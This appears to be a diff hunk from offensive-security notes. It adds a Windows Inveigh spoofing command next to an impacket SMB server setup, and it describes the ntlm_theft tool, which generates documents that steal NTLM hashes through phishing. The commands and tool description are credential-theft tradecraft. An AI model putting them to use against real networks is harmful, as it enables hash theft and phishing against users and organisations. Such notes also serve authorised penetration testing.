@@ -12,6 +12,10 @@ impacket-smbserver xingdi Desktop -smb2support
 Access:
 \\IPv4 address\test || //ip/test
 ```
+```
+Windows:
+Inveigh.exe -SpooferIP ipv4_address
+```
 ###### NTLM_THEFT (https://github.com/Greenwolf/ntlm_theft/tree/master):
 ntlm_theft is an Open Source Python3 Tool that generates 21 different types of hash theft documents. These can be used for phishing when either the target allows smb traffic outside their network, or if you are already inside the internal network.
 ```
